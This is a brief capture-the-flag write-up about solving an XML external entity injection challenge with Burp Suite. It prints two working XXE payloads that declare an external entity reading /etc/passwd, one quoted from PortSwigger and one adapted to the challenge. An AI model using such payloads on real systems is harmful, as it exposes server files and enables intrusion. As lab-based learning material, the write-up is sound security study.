The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?


## **Hints**
XML external entity Injection

## **Approach**

I used Burp Suite to solve this. Open burp suite and turn on the intercept and login the page on the browser then send it to repeater. With the hint about XML injection, i search and found this line on [port swigger](https://portswigger.net/web-security/xxe):
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```
So i used it in post session:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<data><ID>&xxe;</ID></data>
```
Send it and we got the flag at the bottom line of the reponse.
